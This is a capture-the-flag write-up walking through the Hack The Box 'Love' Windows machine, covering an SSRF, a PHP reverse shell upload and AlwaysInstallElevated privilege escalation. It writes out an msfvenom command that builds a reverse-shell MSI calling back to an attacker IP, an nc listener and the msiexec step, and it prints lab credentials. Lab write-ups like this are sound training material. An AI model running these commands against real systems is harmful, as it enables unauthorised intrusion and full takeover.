---
layout: single
title: Love - Hack The Box
excerpt: "Love is a very easy Windows machine that can be easily solved if some basic concepts are clear. It contains a SSRF attack, which is not very common and this machine is a very good example of how it works. Enumeration is also very important here, for both foothold and privilege escalation, this last one taking advantage of the AlwaysInstallElevated feature being turned on."
date: 2021-08-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-love/love_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - easy
  - infosec
tags:  
  - Windows
  - SSRF
  - WinPEAS
  - AlwaysInstallElevated
---

![](/assets/images/htb-writeup-love/love_logo.png)

Love is a very easy Windows machine that can be easily solved if some basic concepts are clear. It contains a SSRF attack, which is not very common and this machine is a very good example of how it works. Enumeration is also very important here, for both foothold and privilege escalation, this last one taking advantage of the AlwaysInstallElevated feature being turned on.

## Nmap

We can scan the machine with `nmap -sV -T5 -p- 10.10.10.239 -oA Love`

![](/assets/images/htb-writeup-love/love2.png)

## Web servers

The first web server, in `http://love.htb`, has a login form into a “voting system”, but there is nothing to do here, at least now.

![](/assets/images/htb-writeup-love/love3.png)

If we look carefully at the nmap scan, we discover a new host, `staging.love.htb`.

![](/assets/images/htb-writeup-love/love4.png)

We can add this host to the hosts file and try to connect to it.

![](/assets/images/htb-writeup-love/love5.png)

The site is a kind of File Scanner, so we can find misconfigurations here to access to the machine.

![](/assets/images/htb-writeup-love/love6.png)

## SSRF attack

After some research, I find out SSRF attacks, which consist on making HTTP requests on the server that is hosting the application, so we can gain access to the machine taking advantage of the fact that the machine can make requests to itself.

![](/assets/images/htb-writeup-love/love7.png)

Then, if we try to access to the port 5000, we will see that we can't as we don't have permissions.

![](/assets/images/htb-writeup-love/love8.png)

Knowing this, we can send a request to localhost:5000 through the machine itself, which will send back to us the corresponding Password Dashboard which was available there, as the machine has permissions to see what is there.

![](/assets/images/htb-writeup-love/love9.png)

There we find some credentials, `admin@LoveIsInTheAir!!!!`.

![](/assets/images/htb-writeup-love/love10.png)

If we go back to the main web, we will see that this credentials doesn’t work here, not that they are wrong, but the web doesn’t answer.

![](/assets/images/htb-writeup-love/love11.png)

To solve this, we can launch a directory enumeration attack to discover hidden directories in the website, with `gobuster dir -u http://love htb/ -w /usr/share/wordlists/dirbuster/big.txt`. We discover an `/admin` directory, which we can access.

![](/assets/images/htb-writeup-love/love12.png)

In that directory, a panel similar to the first one is available, but in this case the credentials work and we can log in.

![](/assets/images/htb-writeup-love/love13.png)

There we find an admin dashboard that we can easily exploit, as we can upload files adding users to the voting system.

![](/assets/images/htb-writeup-love/love14.png)

## Reverse shell

To get a shell in the system, we will upload a PHP Reverse Shell that will give us RCE in the machine. The file should be a photo, but the web accepts .php files, so we won’t mess up with that and we’ll upload directly a reverse shell written in php.

![](/assets/images/htb-writeup-love/love15.png)

This reverse shell can be obtained in the [pentestmonkey github](https://github.com/pentestmonkey/php-reverse-shell). We have to modify it with our own ip and the port that we will be listening to at the time of uploading the shell.

![](/assets/images/htb-writeup-love/love17.png)

We easily upload the file as the photo of our new voter.

![](/assets/images/htb-writeup-love/love16.png)

And we proceed to listen in that port with `nc -nvlp 1234`.

![](/assets/images/htb-writeup-love/love18.png)

When the shell reaches the server, we’ll have access as the user “xampp”. First part of the machine completed.

![](/assets/images/htb-writeup-love/love19.png)

## System enumeration

To detect vulnerabilities in this machine that will lead us to a privileged user, we will be using WinPEAS, a script to enumerate possible vectors in our victim system.

![](/assets/images/htb-writeup-love/love20.png)

After uploading it as we did with the PHP Reverse Shell, what we find and we can check with `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstalledElevated` is that `AlwaysInstalledElevated` is enabled in this machine, which can be easily exploited as we will see.

![](/assets/images/htb-writeup-love/love22.png)

## AlwaysInstallElevated exploitation

In our own system we can prepare a malicious .msi file which we will transfer to the victim machine and then install as admin. To generate this file, we'll be using msfvenom with the command `msfvenom –platform windows –arch x64 –payload windows /x64/shell_reverse_tcp LHOST=10.10.14.126 LPORT=1234 –encoder x64/xor – iteration 9 –format msi –out exp.msi`. In LHOST we use our IP, and in LPORT the port to listen to.

![](/assets/images/htb-writeup-love/love23.png)

After uploading the file as we did before, we can execute it with `msiexec /I “C:\xampp\htdocs\omrs\images\exp.msi”`.

![](/assets/images/htb-writeup-love/love24.png)

Then we will receive a root shell in the nc listener.

![](/assets/images/htb-writeup-love/love25.png)

Now we can get the last flag, which is, as always, in the Desktop of the Administrator user.

![](/assets/images/htb-writeup-love/love27.png)


